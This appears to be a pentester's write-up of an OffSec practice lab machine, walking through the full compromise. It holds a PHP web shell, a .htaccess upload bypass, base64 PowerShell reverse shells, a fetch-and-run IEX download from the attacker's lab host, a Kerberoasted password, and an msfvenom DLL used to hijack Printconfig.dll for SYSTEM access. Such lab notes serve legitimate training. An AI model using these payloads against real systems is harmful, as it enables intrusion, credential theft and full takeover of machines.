# System Information
OS: Windows
Architecture: x86

---
# Service Discovery

Helper scripts source: https://github.com/CameronCandau/Pentest-Automation

```
new-target access 192.168.228.187
cd ~/oscp/access
scan.sh --autorecon
```

## 80/tcp HTTP

![[Pasted image 20260422220840.png]]

feroxbuster points out /Ticket.php:

![[Pasted image 20260422221614.png]]

We see that the "Buy Tickets" form submits to /Ticket.php.

File upload catches my attention. Feroxbuster also pointed out /uploads/. After uploading an image, we find that we can access it directly. This could lead to LFI if the server is misconfigured and allows us to upload/execute PHP code.

![[Pasted image 20260422222245.png]]

Can I upload a shell.php?
```
<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>
```

Nope.

![[Pasted image 20260422222810.png]]

# Initial Access

We can however, upload a .htaccess:

https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/

```
AddType application/x-httpd-php .rce
```

*Reference used in OffSec's writeup for this box -- looks like a great runbook for file upload overall: https://onsecurity.io/article/file-upload-checklist/#uploading-a-htaccess-file*

![[Pasted image 20260422223244.png]]

We can upload shell.rce and then run it:

![[Pasted image 20260422223602.png]]

Same with curl:

`curl -G http://192.168.228.187/uploads/shell.rce --data-urlencode "cmd=whoami"`

![[Pasted image 20260503094142.png]]


Use it to get a reverse shell (payload generated with Penelope):

`curl -G http://192.168.228.187/uploads/shell.rce --data-urlencode "cmd=cmd /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA4ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="`


*Restarted lab (target IP changed to 192.168.125.187)*


# Privilege Escalation

Domain: access.offsec


`Get-ADDomainController`

![[Pasted image 20260503111935.png]]

## Kerberoasting svc_mssql

No accounts vulnerable to asreproast.

![[Pasted image 20260503112002.png]]

1 Kerberoastable user, svc_mssql

![[Pasted image 20260503112738.png]]

Cracked using rockyou.txt:

![[Pasted image 20260503112906.png]]

...

![[Pasted image 20260503112941.png]]

Validate with NetExec:

![[Pasted image 20260503113611.png]]

Add to credentials: svc_mssql:trustno1

![[Pasted image 20260503131853.png]]

Interesting because we didn't see any MSSQL server running on this host. Also not from the host itself:

(nothing listening on 1433/TCP)

![[Pasted image 20260503140634.png]]


No password reuse, only valid for svc_mssql:

![[Pasted image 20260503140757.png]]

## RunasCs.exe as svc_mssql

RunasCs.exe to login locally, since we can't remote in as svc_mssql.

Confirm usage and that we're able to run commands a svc_mssql:

`RunasCs.exe svc_mssql trustno1 "powershell whoami"`

Establish reverse shell:

```
.\RunasCs.exe svc_mssql trustno1 "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANwAzACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

This base64 encoded payload didn't work for me while using RunasCs.exe, so I switched to a staged payload instead, which succeeded.

stage.ps1
```
IEX(IWR http://192.168.45.173:8001/scripts/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.45.173 443
```

![[Pasted image 20260503161853.png]]

## SeManageVolume for System

According to https://github.com/gtworek/Priv2Admin, SeMagageVolume can get us admin.

From Google I found https://github.com/CsEnox/SeManageVolumeExploit which should allow us to abuse the privilege to elevate to Administrator.

After downloading the compiled binary from this repo, transferring it to the target, and running as svc_mssql, it seems that we're now able to write to System32.

icacls output for C:\Windows\System32 confirms that BUILTIN\Users has (F)ull access.

![[Pasted image 20260503164243.png]]

Continuing to follow this repo's directions, I'll replace C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll with a malicious DLL.

*Another example of DLL hijacking/overwriting that we could have used at this point is https://github.com/sailay1996/WerTrigger*

Generate the DLL:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.173 LPORT=4444 -f dll > Printconfig.dll`

Transfer to host, make a copy of Printconfig.dll in case we need to restore, and then replace the original with ours. Then, use the PowerShell from the repo to initiate PrintNotify, which will run Printconfig.dll as system, giving a reverse shell.

```
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$object = [Activator]::CreateInstance($type)
```

![[Pasted image 20260503165548.png]]

![[Pasted image 20260503165822.png]]
# Proof Screenshots (local.txt / proof.txt)
`type` or `cat` flag and [include IP address in screenshot](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements)

![[Pasted image 20260503165919.png]]
